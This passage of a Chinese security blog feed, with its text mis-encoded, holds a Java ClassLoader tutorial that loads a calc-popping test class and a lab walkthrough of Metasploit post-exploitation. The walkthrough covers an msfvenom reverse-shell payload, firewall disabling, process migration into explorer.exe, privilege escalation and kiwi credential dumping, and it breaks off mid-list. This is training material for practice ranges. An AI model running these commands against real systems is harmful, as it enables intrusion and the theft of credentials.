alt="20210108153058-73a8d0f6-5183-1"></p><p>ä¹‹åæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªåŠ å¯†ç±»Encryptionï¼Œä½¿ç”¨ç®€å•çš„é€ä½å–åè¿›è¡ŒåŠ å¯†æ“ä½œã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testCypher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Encryption</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        encode(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/usr/local/com/test/CypherTest.class&quot;</span>), <span class="comment">// è·å–è·¯å¾„CypherTest.classæ–‡ä»¶</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/usr/local/temp/com/test/CypherTest.class&quot;</span>)); <span class="comment">// ä¸ºäº†ä¿æŒä¸€è‡´ï¼Œåˆ›å»ºäº†ä¸€ä¸ªç©ºçš„tempç›®å½•</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(File src, File dest)</span> &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(src);</span><br><span class="line">            fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dest);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// é€ä½å–åæ“ä½œ</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((temp = fis.read()) != -<span class="number">1</span>) &#123;<span class="comment">// è¯»å–ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">                fos.write(temp ^ <span class="number">0xff</span>);<span class="comment">// å–åè¾“å‡º</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123; <span class="comment">// å…³é—­æ•°æ®æµ</span></span><br><span class="line">            <span class="keyword">if</span> (fis != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fis.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;This experiment test is successful&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬çœ‹åˆ°ç”Ÿæˆäº†åŠ å¯†åæ–°çš„CypherTest.classæ–‡ä»¶ã€‚</p><p><img src="E:/blog/source/images/20210108153148-9133b8e8-5183-1.png" alt="20210108153148-9133b8e8-5183-1"></p><p>å› ä¸ºè¿™ä¸ªæ˜¯è‡ªå®šä¹‰åŠ å¯†åï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨å·¥å…·ç›´æ¥è¿›è¡Œåç¼–è¯‘æ“ä½œå’Œç›´æ¥ä½¿ç”¨jvmé»˜è®¤ç±»åŠ è½½å™¨å»ä½¿ç”¨å®ƒã€‚</p><p>ä¹‹åæˆ‘ä»¬å†ç¼–å†™ä¸€ä¸ªDectyptionè§£å¯†ç±»ï¼Œå¯¹æ–°åŠ å¯†çš„CypherTest.classè¿›è¡Œè§£å¯†æ“ä½œã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testCypher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Decryption</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123; <span class="comment">// ç»§æ‰¿ClassLoaderç±»</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String rootDir;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Decryption</span><span class="params">(String rootDir)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rootDir = rootDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// é‡å†™è¦†ç›–findClass</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(className);</span><br><span class="line">        <span class="keyword">if</span> (c != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="built_in">this</span>.getParent();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                c = parent.loadClass(className);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// System.out.println(&quot;çˆ¶ç±»æ— æ³•åŠ è½½ä½ çš„classï¼ŒæŠ›å‡ºClassNotFoundException,å·²æ•è·ï¼Œç»§ç»­è¿è¡Œ&quot;);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;çˆ¶ç±»æˆåŠŸåŠ è½½&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;<span class="comment">// è¯»å–æ–‡ä»¶ è½¬åŒ–æˆå­—èŠ‚æ•°ç»„</span></span><br><span class="line">                <span class="type">byte</span>[] classData = getClassData(className);</span><br><span class="line">                <span class="keyword">if</span> (classData == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">// è°ƒç”¨defineClass()æ–¹æ³•</span></span><br><span class="line">                    c = defineClass(className, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">                    <span class="keyword">return</span> c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getClassData(String className) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> rootDir + <span class="string">&quot;/&quot;</span> + className.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="comment">// å°†æµä¸­çš„æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            is = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((temp = is.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(temp ^ <span class="number">0xff</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    is.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (baos != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    baos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨å°†Decryptionç»§æ‰¿ClassLoaderç±»ï¼Œä¹‹åè¦†ç›–findClass()æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨findClass()æ–¹æ³•ä¸­è°ƒç”¨defineClass()æ–¹æ³•ä½¿ç”¨ï¼Œæœ€ååŠ è½½æˆ‘ä»¬è‡ªå®šä¹‰çš„getClassDataæ–¹æ³•å»è¿›è¡Œè§£å¯†æ“ä½œã€‚</p><p>æœ€åæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªDemoè¿›è¡Œæµ‹è¯•ï¼Œå»æŸ¥çœ‹å½“å‰ç±»åŠ è½½å™¨æœºåˆ¶çš„æƒ…å†µã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è·å–å…¶è¾“å‡ºçš„System.out.printlnè¯­å¥ï¼Œéœ€è¦åå°„æœºåˆ¶å»å®ç°ã€‚è¿™ç¯‡æ–‡ç« æˆ‘ä»¬åªå­¦ä¹ ClassLoaderç±»åº”ç”¨ï¼Œå°±ä¸å»æ¶‰åŠå…¶ä»–çŸ¥è¯†ç‚¹ï¼Œè·å–å…¶ç±»åŠ è½½å™¨æŸ¥çœ‹å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testCypher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Decryption</span> <span class="variable">deLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Decryption</span>(<span class="string">&quot;/usr/local/temp/&quot;</span>);<span class="comment">// è§£å¯†åŠ è½½å™¨</span></span><br><span class="line">        Class&lt;?&gt; t1 = deLoader.loadClass(<span class="string">&quot;com.test.CypherTest&quot;</span>);<span class="comment">// åŠ è½½å·²åŠ å¯†çš„ç±»</span></span><br><span class="line">        System.out.println(<span class="string">&quot;c3 çš„Classæ˜¯  &quot;</span> + t1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="E:/blog/source/images/20210108153311-c27f545c-5183-1.png" alt="20210108153311-c27f545c-5183-1"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>é™¤äº†ä¸Šè¿°è‡ªå®šä¹‰ClassLoaderç±»ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å­¦ä¹ URLClassLoaderã€‚URLClassLoaderç±»ç»§æ‰¿ClassLoaderç±»ï¼Œå¯ä»¥åŠ è½½æœ¬åœ°ç£ç›˜å’Œç½‘ç»œä¸­çš„jaråŒ…ç±»æ–‡ä»¶ã€‚</p><h3 id="1-æœ¬åœ°ç£ç›˜classæ–‡ä»¶è°ƒç”¨"><a href="#1-æœ¬åœ°ç£ç›˜classæ–‡ä»¶è°ƒç”¨" class="headerlink" title="1. æœ¬åœ°ç£ç›˜classæ–‡ä»¶è°ƒç”¨"></a>1. æœ¬åœ°ç£ç›˜classæ–‡ä»¶è°ƒç”¨</h3><p>é¦–å…ˆæˆ‘åœ¨Dç›˜åˆ›å»ºäº†ä¸€ä¸ªTest.javaæ–‡ä»¶ï¼Œå†™äº†ä¸€æ®µcalc.exeè®¡ç®—æœºå¼¹çª—ä»£ç ã€‚å¦‚æœæ–‡ä»¶è¢«æˆåŠŸè§£ææ‰§è¡Œï¼Œä¼šè¾“å‡ºTest successå­—æ®µä¸”å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test success!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;cmd /c calc.exe&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨javacè¿›è¡Œç¼–è¯‘ï¼Œåœ¨Dç›˜ç”Ÿæˆå¯¹åº”çš„classæ–‡ä»¶ã€‚</p><p>ä¹‹åæˆ‘ä»¬å†ä¿®æ”¹ClassLoaderTestç±»ï¼Œåˆ©ç”¨URLClassLoaderæ–¹å¼å»è·å–Dç›˜ä¸­Test.classæ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/&quot;</span>);</span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> file.toURI();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> uri.toURL();</span><br><span class="line"></span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;com.test.Test&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨Fileè·å–ç±»æ–‡ä»¶è·¯å¾„ï¼Œä¹‹åä½¿ç”¨URLClassLoaderè·å–urlåœ°å€ä¸ºDç›˜ï¼Œä¹‹åä½¿ç”¨loadClassæ–¹æ³•è·å–Test.classæ‰€å«åŒ…åï¼Œç„¶åå®ä¾‹åŒ–ã€‚è¿è¡Œå‘ç°è§£æè·å–åˆ°äº†Dç›˜ä¸­Test.classæ–‡ä»¶ã€‚</p><p><img src="/../images/20210108153608-2c5edf50-5184-1.png" alt="20210108153608-2c5edf50-5184-1"></p><h3 id="2-ç½‘ç»œä¼ è¾“classæ–‡ä»¶è°ƒç”¨"><a href="#2-ç½‘ç»œä¼ è¾“classæ–‡ä»¶è°ƒç”¨" class="headerlink" title="2. ç½‘ç»œä¼ è¾“classæ–‡ä»¶è°ƒç”¨"></a>2. ç½‘ç»œä¼ è¾“classæ–‡ä»¶è°ƒç”¨</h3><p>ä¹‹åæˆ‘ä»¬å°†Test.classæ”¾ç½®åˆ°ç”µè„‘çš„TomcatæœåŠ¡å™¨ç›®å½•ä¸‹ï¼Œç„¶åå¯åŠ¨Tomcatã€‚ä¹‹åæ–°å»ºä¸ªClassLoaderDemoç±»ç½‘ç»œåŠ è½½TomcatæœåŠ¡å™¨ä¸­çš„Test.class.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/examples/&quot;</span>);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;com.test.Test&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨URLClassLoaderåŠ è½½ç½‘ç»œä¸­çš„TomcatæœåŠ¡å™¨ç›®å½•ï¼ŒæˆåŠŸè§£æè·å–åˆ°äº†ç›®å½•ä¸‹çš„Test.classæ–‡ä»¶ã€‚</p><p><img src="/../images/20210108154306-25852314-5185-1.png" alt="20210108154306-25852314-5185-1"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>é€šè¿‡ClassLoaderç±»çš„å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“ä¸ä»…ä»…å±€é™äºåœ¨ClassPathä¸­ç±»çš„è°ƒç”¨ï¼Œè¿˜èƒ½å¤Ÿé€šè¿‡è‡ªå®šä¹‰CLassLoaderç±»æ¥åŠ è½½æˆ‘ä»¬ç‰¹å®šçš„ç±»æ¥æ“ä½œåˆ©ç”¨ã€‚åœ¨å®‰å…¨é¢†åŸŸå½“ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šä½¿ç”¨å…¶ClassLoaderç‰¹æ€§ï¼Œè‡ªå®šä¹‰æ¶æ„çš„ç±»åŠ è½½webshellåˆ©ç”¨ä»¥åŠè‡ªå®šä»¥ç±»å­—èŠ‚ç çš„nativeæ–¹æ³•ç»•è¿‡RASPæ£€æµ‹ã€‚æ‰€ä»¥äº†è§£ClassLoaderç‰¹æ€§å¹¶è¿›è¡Œè‡ªå®šä¹‰ç¼–å†™ï¼Œå¯¹æˆ‘ä»¬äº†è§£javaå®‰å…¨æœºåˆ¶ååˆ†é‡è¦ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ—¥é¶åœº1</title>
      <link href="/2023/05/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"/>
      <url>/2023/05/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>é€šè¿‡MSFå¯¹çº¢æ—¥é¶åœº1è¿›è¡Œå†…ç½‘æ¸—é€</p><p>è·å¾—è¾¹ç•ŒæœåŠ¡å™¨æƒé™æ²¡å•¥å¥½å†™çš„å°±ä¸å†™äº†</p></blockquote><h2 id="è·å¾—å¤–ç½‘ä¸»æœºæƒé™"><a href="#è·å¾—å¤–ç½‘ä¸»æœºæƒé™" class="headerlink" title="è·å¾—å¤–ç½‘ä¸»æœºæƒé™"></a>è·å¾—å¤–ç½‘ä¸»æœºæƒé™</h2><h3 id="æœ¨é©¬ç”Ÿæˆ"><a href="#æœ¨é©¬ç”Ÿæˆ" class="headerlink" title="æœ¨é©¬ç”Ÿæˆ"></a>æœ¨é©¬ç”Ÿæˆ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.41.128  -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure><p><strong>reverse_tcpä¸bind_tcpçš„åŒºåˆ«</strong></p><p><img src="/../images/1605154-20200928100839725-1360637319-1686283281460.png" alt="img"></p><h3 id="é˜²ç«å¢™å…³é—­"><a href="#é˜²ç«å¢™å…³é—­" class="headerlink" title="é˜²ç«å¢™å…³é—­"></a>é˜²ç«å¢™å…³é—­</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul><li><p>æŸ¥çœ‹çŠ¶æ€</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall show allprofile state</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ”¹çŠ¶æ€</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofile state on/off</span><br></pre></td></tr></table></figure><p>ä¸å…³çš„è¯ï¼Œæ‰§è¡Œæœ¨é©¬å°±ä¼šå¼¹å‡ºè¿™ä¸ª</p><p><img src="/../images/image-20230324195048832-1686283281461.png" alt="image-20230324195048832"></p></li></ul><h3 id="è·å¾—ä¸»æœºsession"><a href="#è·å¾—ä¸»æœºsession" class="headerlink" title="è·å¾—ä¸»æœºsession"></a>è·å¾—ä¸»æœºsession</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp # è¦è®¾ç½®æœ¨é©¬çš„ç”Ÿæˆpayloadï¼Œä¸ç„¶è¿ä¸ä¸Š</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324151026344-1686283281461.png" alt="image-20230324151026344"></p><h2 id="ä¿¡æ¯æ”¶é›†ç­‰"><a href="#ä¿¡æ¯æ”¶é›†ç­‰" class="headerlink" title="ä¿¡æ¯æ”¶é›†ç­‰"></a>ä¿¡æ¯æ”¶é›†ç­‰</h2><h4 id="è¿›ç¨‹è¿ç§»"><a href="#è¿›ç¨‹è¿ç§»" class="headerlink" title="è¿›ç¨‹è¿ç§»"></a>è¿›ç¨‹è¿ç§»</h4><ol><li><p>éšè”½è‡ªèº«</p><p>é€‰æ‹©æ³¨å…¥åˆ°explorer.exeè¿›ç¨‹ä¸­</p><blockquote><p>explorer.exeæ˜¯<a href="https://baike.baidu.com/item/Windows/165458?fromModule=lemma_inlink">Windows</a>ç¨‹åºç®¡ç†å™¨æˆ–è€…<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8/58635296?fromModule=lemma_inlink">æ–‡ä»¶èµ„æºç®¡ç†å™¨</a>ï¼Œå®ƒç”¨äºç®¡ç†Windowså›¾å½¢å£³ï¼ŒåŒ…æ‹¬æ¡Œé¢å’Œ<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/1452357?fromModule=lemma_inlink">æ–‡ä»¶ç®¡ç†</a>ï¼Œåˆ é™¤è¯¥ç¨‹åºä¼šå¯¼è‡´Windows<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/8146283?fromModule=lemma_inlink">å›¾å½¢ç•Œé¢</a>æ— æ³•ä½¿ç”¨ã€‚</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps | grep &quot;explore&quot;</span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324152046245-1686283281461.png" alt="image-20230324152046245"></p></li><li><p>åˆ‡æ¢è¿›ç¨‹ä½æ•°</p><blockquote><p>ä¸åŒçš„ç¨‹åºéœ€è¦çš„ä½æ•°ä¸åŒ</p><p>å¦‚ï¼šhashdumpï¼Œkiwiåªèƒ½åœ¨64ä½è¿›ç¨‹ä¸Šæ‰§è¡Œ</p></blockquote></li></ol><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><blockquote><p>å…ˆè·å–åˆ°administratoræƒé™</p><p>å†ä½¿ç”¨getsystemå‘½ä»¤è·å–systemæƒé™</p></blockquote><p><img src="/../images/image-20230324152320920-1686283281461.png" alt="image-20230324152320920"></p><h4 id="ä¸»æœºä¿¡æ¯æ”¶é›†"><a href="#ä¸»æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸»æœºä¿¡æ¯æ”¶é›†"></a>ä¸»æœºä¿¡æ¯æ”¶é›†</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸»æœºä¿¡æ¯</span></span><br><span class="line">ps</span><br><span class="line">sysinfo</span><br><span class="line">run post/windows/gather/enum_applications # å®‰è£…çš„åº”ç”¨</span><br><span class="line">run post/windows/gather/enum_patches # å®‰è£…çš„è¡¥ä¸</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç½‘ç»œ</span></span><br><span class="line">route</span><br><span class="line">arp</span><br><span class="line">netstat â€“ano</span><br></pre></td></tr></table></figure><h4 id="åŸŸä¿¡æ¯æ”¶é›†"><a href="#åŸŸä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸä¿¡æ¯æ”¶é›†"></a>åŸŸä¿¡æ¯æ”¶é›†</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324155246737-1686283281461.png" alt="image-20230324155246737"></p><p>ä¸»æœºshellä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chcp 65001 #è§£å†³ä¹±ç </span><br><span class="line">ipconfig /all # DNSåç¼€åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨</span><br><span class="line">net time /domain # åˆ¤æ–­åŸŸæ§</span><br><span class="line">nslookup time_domain # è·å–åŸŸæ§ip</span><br></pre></td></tr></table></figure><h4 id="å¯†ç è·å–"><a href="#å¯†ç è·å–" class="headerlink" title="å¯†ç è·å–"></a>å¯†ç è·å–</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230330143036863-1686283281461.png" alt="image-20230330143036863"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">creds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ®</span><br><span class="line">creds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ®</span><br><span class="line">creds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ®</span><br><span class="line">creds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ®</span><br><span class="line">creds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ®</span><br><span class="line">creds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ®</span><br><span class="line">dcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯</span><br><span class="line">dcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID</span><br><span class="line">golden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ®</span><br><span class="line">kerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ®</span><br><span 